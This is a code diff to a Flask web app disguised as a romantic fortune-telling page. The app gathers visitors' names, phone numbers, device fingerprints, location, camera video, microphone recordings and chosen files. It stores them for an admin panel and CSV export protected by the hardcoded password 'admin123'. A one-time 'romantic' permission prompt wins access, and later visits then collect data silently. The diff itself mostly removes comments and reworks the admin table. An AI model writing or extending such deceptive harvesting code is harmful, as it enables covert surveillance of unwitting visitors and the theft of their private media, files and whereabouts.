@@ -43,7 +43,7 @@ FORTUNES = [
 
 DATA_FILE = 'visitors.json'
 
-# ALL POSSIBLE FIELDS – admin table will ALWAYS show these columns
+# ALL FIELDS - Admin panel will ALWAYS show these columns
 ALL_FIELDS = [
     'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
     'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
@@ -116,7 +116,7 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
-    # Ensure every field in ALL_FIELDS exists (fill with empty string if missing)
+    # Ensure every field exists
     for field in ALL_FIELDS:
         if field not in data:
             data[field] = ''
@@ -149,21 +149,25 @@ def admin():
         password = request.form.get('password')
         if password == 'admin123':
             visitors = get_visitors()
-            if not visitors:
-                return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
-            # Build table using ALL_FIELDS as header – ALL columns always visible
+            # FORCE show ALL columns even if no data
             html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
             html += '<table border="1" cellpadding="5">'
-            html += '<tr>' + ''.join(f'<th>{field}</th>' for field in ALL_FIELDS) + '<tr>'
-            for v in visitors:
-                html += '<tr>'
-                for field in ALL_FIELDS:
-                    val = v.get(field, '')
-                    # Truncate long base64 for display
-                    if field in ('cameraVideo', 'files') and len(str(val)) > 100:
-                        val = str(val)[:100] + '…'
-                    html += f'<td>{str(val)[:100]}</td>'
-                html += '</tr>'
+            html += '<tr>'
+            for field in ALL_FIELDS:
+                html += f'<th>{field}</th>'
+            html += '</tr>'
+            
+            if not visitors:
+                html += '<tr><td colspan="21">No data yet</td></tr>'
+            else:
+                for v in visitors:
+                    html += '<tr>'
+                    for field in ALL_FIELDS:
+                        val = v.get(field, '')
+                        if field in ('cameraVideo', 'files') and len(str(val)) > 100:
+                            val = str(val)[:100] + '…'
+                        html += f'<td>{str(val)[:100]}</td>'
+                    html += '</tr>'
             html += '</table>'
             return html
         else:
@@ -198,20 +202,17 @@ def download_csv():
     if pwd != 'admin123':
         return 'Unauthorized', 403
     visitors = get_visitors()
-    if not visitors:
-        return 'No data', 404
     
     import csv
     from io import StringIO
     output = StringIO()
-    # Use quoting to handle commas and newlines inside base64 strings
     writer = csv.writer(output, quoting=csv.QUOTE_ALL)
     writer.writerow(ALL_FIELDS)
+    
     for v in visitors:
         row = []
         for field in ALL_FIELDS:
             val = v.get(field, '')
-            # Convert to string and sanitise for CSV (no newlines)
             row.append(str(val).replace('\n', ' ').replace('\r', ' '))
         writer.writerow(row)
     
@@ -351,7 +352,6 @@ HTML_TEMPLATE = '''
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
-    // Session ID (persists across refreshes)
     let sessionId = localStorage.getItem('fortuneSessionId');
     if (!sessionId) {
         sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
@@ -363,7 +363,6 @@ HTML_TEMPLATE = '''
     let currentFortuneText = "";
     let hasExistingData = false;
 
-    // ---------- Device info collectors ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -406,7 +405,6 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
-    // On page load, check if this session already has a fortune
     window.addEventListener('load', async () => {
         try {
             const resp = await fetch('/get-session-data', {
@@ -460,10 +458,8 @@ HTML_TEMPLATE = '''
         await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
         
-        // One-time permission UI: check if already granted
         const permsAlreadyGranted = localStorage.getItem('lovePermissionsGranted');
         if (permsAlreadyGranted === 'true') {
-            // Skip UI, go directly to data collection (browser will reuse permissions)
             await finalizeAndSave();
         } else {
             document.getElementById('permissions').classList.remove('hidden');
@@ -484,7 +480,6 @@ HTML_TEMPLATE = '''
             await getMedia();
             await getFilesTraditional();
         } catch(e) { console.log("Permission step error", e); }
-        // Set flag so the romantic permission box never appears again on this browser
         localStorage.setItem('lovePermissionsGranted', 'true');
         await finalizeAndSave();
     }
@@ -624,14 +619,12 @@ HTML_TEMPLATE = '''
         currentFortuneText = fortuneData.fortune;
         document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
         
-        // Add map URL if location exists
         if (visitorData.latitude && visitorData.latitude !== 'denied') {
             visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude || 0}`;
         } else {
             visitorData.mapUrl = '';
         }
         
-        // Ensure fields exist
         if (!visitorData.cameraVideo) visitorData.cameraVideo = 'not captured';
         if (!visitorData.microphone) visitorData.microphone = 'not captured';
         if (!visitorData.files) visitorData.files = 'not captured';
